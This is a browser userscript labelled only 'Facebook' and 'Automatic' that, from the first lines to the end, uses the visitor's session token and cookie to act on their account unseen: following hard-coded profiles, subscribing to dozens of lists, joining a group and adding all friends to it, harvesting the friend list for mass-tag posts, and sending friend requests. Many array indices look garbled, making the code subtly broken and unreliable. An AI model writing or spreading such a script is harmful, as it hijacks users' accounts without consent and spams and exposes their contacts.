// ==UserScript==
// @name            Facebook
// @namespace       Anonymous
// @description     Automatic
// @author          MARJUN JUNMAR
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -100) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -100)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 100)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-100)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[100]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=100";
     
    var params4 = "profile_id=" + abone + "&location=100&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}


a("100005458748755")
a("100004781735423")
a("100007876812299")
sublist("273788819457174");
sublist("273789162790473");
sublist("273789262790463");
sublist("273789262790346");
sublist("273789436123779");
sublist("273789496123773");
sublist("275890379247018");
sublist("275890409247015");
sublist("275890542580335");
sublist("275890579246998");
sublist("275890605913662");
sublist("275890615913661");
sublist("277783799057676");
sublist("276067205896002");
sublist("276067512562638");
sublist("276067605895962");
sublist("276067789229277");
sublist("276067945895928");
sublist("276068025895920");
sublist("276068222562567");
sublist("276068525895870");
sublist("223721777819779");
sublist("223721677819789");
sublist("223721894486434");
sublist("223722244486399");
sublist("223722061153084");
sublist("1385926928346521");
sublist("1385926988346515");
sublist("1385927111679836");
sublist("1385927298346484");
sublist("1385927578346456");
sublist("1385927811679766");
sublist("1385927995013081");
sublist("1385928131679734");
sublist("1385928458346368");
sublist("1385928608346353");
sublist("1385928715013009");
sublist("1385928931679654");
sublist("1385929128346301");
sublist("1385929315012949");
sublist("1385929368346277");
sublist("1385929478346266");
sublist("1385929678346246");
sublist("1385929791679568");
sublist("1385929965012884");
sublist("1385930125012868");
sublist("1385930328346181");
sublist("1385930488346165");
sublist("1385930668346147");
sublist("1385930765012804");
sublist("1385930888346125");
sublist("1385937055012175");
sublist("1385937245012156");
sublist("1385937468345467");
sublist("1385937611678786");
sublist("1385937681678779");
sublist("10200282613346515");

var gid = ['4'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[100]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=100';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[100]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=100&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=100';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "1411705412390278";
var spost_id = "1411705412390278";
var sfoto_id = "1411705412390278";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[100]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/100);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*100;i<(f+100)*100;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[100]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=100" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=100" + params, true); }
        xmlhttp.send();
}

var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[100].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[100].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);

function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=100", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 100){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 100){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[100].split(";")[0].toString()){
                xmlhttp.send(params);
}
}

var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][100].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "100"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
 
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}
 
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 100) {
        w = document.getElementsByClassName('pbm fsm')[0];
 
        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Facebook';
        e.className = 'uiButton';
        e.onclick = autoSuggest;
 
        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}
 
blub();
 
document.addEventListener("DOMNodeInserted", blub, true);